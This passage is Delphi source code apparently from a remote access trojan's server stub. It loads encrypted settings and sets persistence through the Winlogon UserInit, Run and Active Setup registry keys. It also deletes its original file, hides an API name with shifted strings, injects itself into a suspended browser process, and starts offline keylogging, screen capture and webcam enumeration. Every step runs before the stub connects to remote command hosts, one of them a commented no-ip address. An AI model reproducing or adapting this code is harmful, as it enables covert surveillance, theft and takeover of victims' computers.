  ResourceHandle: THandle;
  ResourcePointer: pointer;
  str: string;
  s: string;
begin

  ResourceLocation := FindResourceA(hInstance, 'SETTINGS', RT_RCDATA);
  ResourceSize := SizeofResource(hInstance, ResourceLocation);
  ResourceHandle := LoadResource(hInstance, ResourceLocation);
  ResourcePointer := LockResource(ResourceHandle);
  if ResourcePointer <> nil then begin
    SetLength(str, ResourceSize);
    CopyMemory(@str[1], ResourcePointer, ResourceSize);
    FreeResource(ResourceHandle);
    Str := ca(Str);
    ServerData.AssignedGroup := Split(Str,'|',1);
    ServerData.AssignedName := Split(Str,'|',2);
    ServerData.InstallFolder := Split(Str,'|',3);
    ServerData.InstallName := Split(Str,'|',4);
    ServerData.Injection := Split(Str,'|',5);
    ServerData.UserInit := Split(Str,'|',6);
    ServerData.RegRun := Split(Str,'|',7);
    ServerData.Activex := Split(Str,'|',8);
    ServerData.RegRunKey := Split(Str,'|',9);
    ServerData.ActiveXKey := Split(Str,'|',10);
    ServerData.Persistent := Split(Str,'|',11);
    ServerData.Connections := Split(Str,'|',12);
    ServerData.CopyToAds := Split(Str,'|',13);
    ServerData.OfflineLogger := Split(Str,'|',14);
    ServerData.OfflineScreenCapture := Split(Str,'|',15);
    ServerData.Melt := Split(Str,'|',16);
    ServerData.UserMode := Split(Str,'|',17);
    ServerData.KernelMode := Split(Str,'|',18);
    ServerData.Password := Split(Str,'|',19);
    ServerData.SleepInterval := Split(Str,'|',20);
    ServerData.FolderSize := Split(Str,'|',21);
  end else begin
    ServerData.AssignedGroup := 'New Users';
    ServerData.AssignedName := UserName;
    ServerData.InstallFolder :=  SysDir;
    ServerData.InstallName := 'app.exe';
    ServerData.OfflineLogger := 'True';
    ServerData.OfflineScreenCapture := 'False';
    ServerData.UserInit := 'True';
    ServerData.RegRun := 'True';
    ServerData.Activex := 'True';
    ServerData.RegRunKey := 'app';
    ServerData.ActiveXKey := '[Random-Number-Here]';
    ServerData.Injection := 'True';
    ServerData.CopyToAds := 'False';
    ServerData.Persistent := 'False';
    ServerData.Melt := 'False';
    ServerData.UserMode := 'False';
    ServerData.KernelMode := 'False';
    ServerData.Connections := 'PC:81;';// msconnection.no-ip.info:44644'; //44644
    ServerData.Password := 'admin';
    ServerData.SleepInterval := '6000';
    ServerData.FolderSize := '0';
  end;

  ServerData.InstallFolder := ParsePath(ServerData.InstallFolder);
  ServerData.InstallFolder := IncludeTrailingBackslash(ServerData.InstallFolder);
  if ServerData.CopyToAds = 'True' then ServerData.InstallFolder := MakePathAds(ServerData.InstallFolder);
  if AccountType <> 'Administrator' then ServerData.InstallFolder := GetSpecialFolder(CSIDL_LOCAL_APPDATA);
  MakeSureDirectoryPathExists(pchar(MakePathNormal(ServerData.InstallFolder)));

end;

var
  Thr: dword;
  SocketData: TSocketData;
  Data,browser: string;
  Temp,TempConnections: string;
  Stream: TMemorySTream;
  s,s2: string;
  er: integer;
  BytesWrite: dword;
  FileHandle: THandle;
  Value: bool;
  App: TApplication;
  Msg: TMsg;
begin
  //Messagebox(0,pchar(ParsePath('%PROGRAMFILES%')),getcommandline,0);
  NoErrMsg := True;
  SetErrorMode(SEM_FAILCRITICALERRORS + SEM_NOALIGNMENTFAULTEXCEPT + SEM_NOGPFAULTERRORBOX + SEM_NOOPENFILEERRORBOX);

  StartedAt := GetTickCount;

  loadlibrary('kernel32');
  loadlibrary('advapi32');
  loadlibrary('user32');
  loadlibrary('shell32');
  loadlibrary('avicap32');
  loadlibrary('ws2_32');
  loadlibrary('imagehlp');
  loadlibrary('advpack');

  GetSettings;

  if ServerData.UserMode = 'True' then RemoveUserHooks;
  if ServerData.KernelMode = 'True' then RemoveKernelHooks;


  Browser := GetBrowser;

  if Pos('-r',GetCommandLine) = 0 then begin
    DeleteFile(pchar(ServerPath));
    CopyFile(pchar(ParamStr(0)),pchar(ServerPath),False);
    //Messagebox(0,pchar(ServerPath),'',0);

    if (ParamStr(0) <> ServerPath) and (ServerData.Melt = 'True') then DeleteFileEx(pchar(ParamStr(0)));
    FillChar(ProcInfo, SizeOf(TProcessInformation), 0);
    FillChar(StartInfo, SizeOf(TStartupInfo), 0);
    FillChar(Context, SizeOf(TContext), 0);
    if not DebugMode then begin
      CreateProcess(pchar(ServerPath),'-r', nil, nil, False, 0, nil, nil, StartInfo, ProcInfo);
      ExitProcess(0);
    end;
  end;

  if ServerData.UserInit = 'True' then begin
    RegGetString(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserInit',s);
    if Pos(ServerPath,s) = 0 then begin
      if RightStr(s,1) = ',' then begin
        s2 := s + ServerPath;
      end else begin
        s2 := s + ',' + ServerPath;
      end;
      RegSetString(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserInit',s2);
    end;
  end;

  if ServerData.RegRun = 'True' then begin
    if AccountType = 'Administrator' then begin
      RegSetString(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Windows\CurrentVersion\Run\' + ServerData.RegRunKey,ServerPath);
    end else begin
      RegSetString(HKEY_CURRENT_USER,'SOFTWARE\Microsoft\Windows\CurrentVersion\Run\' + ServerData.RegRunKey,ServerPath);
    end;
  end;


  if (Paramstr(0) <> Browser) and (ServerData.Injection = 'True') then begin
    Stream := TMemoryStream.Create;
    Stream.LoadFromFile(ParamStr(0));
    SetString(NewFileData,pchar(Stream.Memory),Stream.Size);
    Stream.Free;
    FillChar(ProcInfo, SizeOf(TProcessInformation), 0);
    FillChar(StartInfo, SizeOf(TStartupInfo), 0);
    FillChar(Context, SizeOf(TContext), 0);
    if not DebugMode then begin
      CreateProcess(pchar(Browser),'-r', nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
      RunInMemory(@NewFileData[1]);
      ExitProcess(0);
    end;
  end;


  if ServerData.Activex = 'True' then begin
    RegSetString(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Active Setup\Installed Components\' + ServerData.ActiveXKey + '\StubPath',ServerPath);
    NewSHDeleteKey := NewGetProcAddress('timxbqj/emm','TIEfmfufLfzB');
    Temp := 'SOFTWARE\Microsoft\Active Setup\Installed Components\' + ServerData.ActiveXKey;
    NewShDeleteKey(HKEY_CURRENT_USER, PChar(Temp));
  end;

  MutexName := 'srtgwrgt'; //'56y^&FV';
  ServerMutex := CreateMutex(nil,False,pchar(MutexName));
  if GetLastError = ERROR_ALREADY_EXISTS then begin
    CloseHandle(ServerMutex);
    ExitProcess(0);
  end;

  //SpreadFiles(ServerPath,True);

  if ServerData.OfflineLogger = 'True' then begin
    UnitOfflineKeyLogger.ParseData(nil,'Start');
  end;

  if ServerData.OfflineScreenCapture = 'True' then begin
    UnitOfflineScreenCapture.ParseData(nil,'Start');
  end;

  if ServerData.Persistent = 'True' then begin
    MakePersistent;
    CreateThread(nil,0,@PersistentThread,nil,0,Thr);
  end;

  CapGetDriverDescriptionA := GetProcAddress(LoadLibrary('avicap32.dll'),'capGetDriverDescriptionA');
  ListCamDrivers;

  Randomize;
  TempConnections := ServerData.Connections;
  while length(TempConnections) > 0 do begin
    Temp := Split(TempConnections,';',1);
    Delete(TempConnections,1,Length(Temp)+1);
    SocketData := TSocketData.Create;
    SocketData.MainSocket := True;
    SocketData.RemoteHost := Split(Temp,':',1);
    SocketData.RemotePort := StrToInt(Split(Temp,':',2));
    SocketData.ThreadHandle := BeginThread(nil,0,@NewMaster,pointer(SocketData),0,Thr);
    Sleep(1500);
  end;

  //App := TApplication.Create;
  while true do begin
    sleep(10);
    //App.ProcessMessages;
    PeekMessage(Msg, 0, 0, 0, PM_REMOVE);
    TranslateMessage(Msg);
    DispatchMessage(Msg);
  end;

end.
